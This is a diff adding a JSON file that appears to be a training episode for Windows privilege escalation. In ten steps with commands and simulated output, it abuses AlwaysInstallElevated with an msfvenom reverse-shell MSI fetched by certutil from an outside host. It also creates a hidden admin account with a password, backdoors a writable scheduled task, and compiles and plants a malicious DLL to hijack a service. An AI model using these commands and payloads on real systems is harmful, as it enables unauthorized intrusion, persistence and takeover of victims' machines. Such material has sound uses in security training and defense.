@@ -1,0 +1,85 @@
+{
+  "title": "Episode 3: Multi-Vector Privilege Escalation via Misconfigurations and DLL Hijacking",
+  "scenario": "Assumed breach scenario - gained access as standard domain user (john.doe) on Windows 10 workstation via phishing. No admin rights, recent patches installed (MS16-032 patched), modern defenses active (Windows Defender, AppLocker). Objective: Escalate to local admin through configuration weaknesses, DLL hijacking, and persistence mechanisms despite defensive controls.",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Enumerate system for AlwaysInstallElevated misconfiguration",
+      "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated && reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated",
+      "output": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n\nHKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n\nBoth registry keys set to 1 - VULNERABLE!\nMSI installers will run as SYSTEM!",
+      "explanation": "Found AlwaysInstallElevated misconfiguration allowing SYSTEM execution via MSI"
+    },
+    {
+      "step": 2,
+      "description": "Generate malicious MSI with msfvenom",
+      "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.50 LPORT=4444 -f msi -o backdoor.msi",
+      "output": "[-] No platform was selected, choosing Windows\n[-] No arch selected, selecting arch: x64\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of msi file: 159744 bytes\nSaved as: backdoor.msi\n\nMalicious MSI created (159KB)\nPayload: Reverse shell to 10.10.14.50:4444",
+      "explanation": "Created MSI installer with reverse shell payload for SYSTEM execution"
+    },
+    {
+      "step": 3,
+      "description": "Transfer and execute MSI on target",
+      "command": "certutil -urlcache -f http://10.10.14.50/backdoor.msi C:\\Users\\john.doe\\AppData\\Local\\Temp\\update.msi\nmsiexec /quiet /qn /i C:\\Users\\john.doe\\AppData\\Local\\Temp\\update.msi",
+      "output": "****  Online  ****\nCertUtil: -URLCache command completed successfully.\n\nMSI installation started silently...\n\n[On attacker]:\nnc -lvnp 4444\nListening on 0.0.0.0 4444\nConnection received from 10.10.10.25:49823\nMicrosoft Windows [Version 10.0.19041]\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nSYSTEM shell via AlwaysInstallElevated!",
+      "explanation": "MSI executed with SYSTEM privileges due to AlwaysInstallElevated policy"
+    },
+    {
+      "step": 4,
+      "description": "Create persistent local admin account",
+      "command": "net user persist P@ssw0rd123! /add\nnet localgroup administrators persist /add\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v persist /t REG_DWORD /d 0 /f",
+      "output": "The command completed successfully.\nThe command completed successfully.\nThe operation completed successfully.\n\nPersistent admin account created:\n  Username: persist\n  Password: P@ssw0rd123!\n  Permissions: Local Administrator\n  Hidden: Yes (SpecialAccounts\\UserList)\n\nAccount hidden from login screen and user list!",
+      "explanation": "Created hidden local admin account for persistent access"
+    },
+    {
+      "step": 5,
+      "description": "Search for writable scheduled task scripts",
+      "command": "schtasks /query /fo LIST /v | findstr /i \"Task To Run\" && for /f \"tokens=*\" %a in ('dir /s /b C:\\Scripts\\*.bat C:\\Scripts\\*.ps1 2^>nul') do @icacls \"%a\" | findstr /i \"Everyone:(F) Users:(F)\"",
+      "output": "Task To Run: C:\\Scripts\\cleanup.bat\nTask To Run: C:\\Scripts\\backup.ps1\nTask To Run: C:\\Scripts\\maintenance.bat\n\nC:\\Scripts\\cleanup.bat Everyone:(F)\nC:\\Scripts\\maintenance.bat BUILTIN\\Users:(OI)(CI)(M)\n\nWritable scheduled tasks found:\n  cleanup.bat - runs as SYSTEM daily\n  maintenance.bat - runs as Administrators weekly",
+      "explanation": "Found scheduled task scripts with weak permissions"
+    },
+    {
+      "step": 6,
+      "description": "Backdoor scheduled task for persistence",
+      "command": "echo net localgroup administrators john.doe /add >> C:\\Scripts\\cleanup.bat",
+      "output": "Malicious command appended to cleanup.bat\n\nOriginal task:\n  Runs: Daily at 2:00 AM\n  Privileges: SYSTEM\n  \nBackdoor: Adds john.doe to Administrators on next run\n\nForce execution:\n  schtasks /run /tn CleanupTask",
+      "explanation": "Injected command into writable scheduled task for privilege escalation"
+    },
+    {
+      "step": 7,
+      "description": "Search for DLL hijacking opportunities with Process Monitor filter",
+      "command": "[Run Process Monitor with filter: Result is \"NAME NOT FOUND\", Path ends with \".dll\"]\n[Restart application: C:\\Program Files\\CustomApp\\app.exe]",
+      "output": "Process Monitor capture:\n\nTime: 17:15:30  Process: app.exe  Operation: CreateFile  Path: C:\\Program Files\\CustomApp\\version.dll  Result: NAME NOT FOUND\nTime: 17:15:30  Process: app.exe  Operation: CreateFile  Path: C:\\Windows\\System32\\version.dll  Result: SUCCESS\n\nMissing DLL opportunity:\n  Application: app.exe (runs as SYSTEM on startup)\n  Missing: C:\\Program Files\\CustomApp\\version.dll\n  Fallback: C:\\Windows\\System32\\version.dll\n\nChecking directory permissions...\nicacls \"C:\\Program Files\\CustomApp\"\nBUILTIN\\Users:(OI)(CI)(F)\n\nDirectory writable - DLL hijacking possible!",
+      "explanation": "Found DLL search order vulnerability in SYSTEM service application"
+    },
+    {
+      "step": 8,
+      "description": "Create malicious DLL for hijacking",
+      "command": "[Create evil.c]\n#include <windows.h>\n#include <stdlib.h>\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {\n  if (reason == DLL_PROCESS_ATTACH) {\n    system(\"cmd /c net localgroup administrators john.doe /add\");\n  }\n  return TRUE;\n}\n\ngcc -shared -o version.dll evil.c\ncopy version.dll \"C:\\Program Files\\CustomApp\\version.dll\"",
+      "output": "DLL compiled: version.dll\n        1 file(s) copied.\n\nMalicious DLL placed in application directory\n\nDLL will load when:\n  - System reboots (app auto-starts)\n  - Service restarts\n  - Application launched\n\nDllMain executes: Adds john.doe to Administrators\nRuns in context of: SYSTEM",
+      "explanation": "Created and placed malicious DLL in application directory for privilege escalation on next execution"
+    },
+    {
+      "step": 9,
+      "description": "Check for writable service binaries in PATH",
+      "command": "for %p in (\"%path:;=\" \"%\") do @( if exist %p ( icacls %p | findstr /i \"Users:(F) Everyone:(F)\" && echo %p ) )",
+      "output": "C:\\CustomTools BUILTIN\\Users:(OI)(CI)(F)\n\nWritable PATH directory: C:\\CustomTools\n\nSysteminfo shows:\n  Several services load DLLs from PATH\n  C:\\CustomTools is checked before System32\n\nDLL hijacking via PATH:\n  Place malicious DLL in C:\\CustomTools\n  Service loads DLL on startup\n  Code executes as SYSTEM",
+      "explanation": "Found writable directory in system PATH for DLL search order hijacking"
+    },
+    {
+      "step": 10,
+      "description": "Trigger DLL hijack by restarting vulnerable service",
+      "command": "sc query CustomAppService\nsc stop CustomAppService\nsc start CustomAppService",
+      "output": "SERVICE_NAME: CustomAppService\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 4  RUNNING\n        WIN32_EXIT_CODE    : 0  (0x0)\n\nSERVICE_NAME: CustomAppService\n        STATE              : 1  STOPPED\n\nSERVICE_NAME: CustomAppService\n        STATE              : 2  START_PENDING\n        STATE              : 4  RUNNING\n        PID                : 4892\n\nService restarted - DLL loaded!\n\nChecking privilege escalation:\nC:\\> net localgroup administrators\nAlias name     administrators\nMembers\n---------------\nAdministrator\njohn.doe        <-- Successfully added!\npersist\n\nPrivilege escalation via DLL hijacking successful!",
+      "explanation": "Service restart triggered DLL load and malicious code execution as SYSTEM"
+    }
+  ],
+  "outcome": "Successfully escalated privileges on hardened Windows 10 system using multiple techniques: AlwaysInstallElevated policy abuse for initial SYSTEM access, created hidden persistent admin account, backdoored writable scheduled task, and performed DLL hijacking on service binary. Demonstrated that even patched systems with defensive controls can be compromised through configuration weaknesses and application-level vulnerabilities.",
+  "learning_objectives": [
+    "Exploit AlwaysInstallElevated policy with malicious MSI installers",
+    "Create hidden persistent administrator accounts",
+    "Identify and backdoor writable scheduled task scripts",
+    "Discover DLL hijacking opportunities with Process Monitor",
+    "Develop malicious DLLs for privilege escalation",
+    "Chain multiple privilege escalation vectors for redundancy"
+  ]
+}
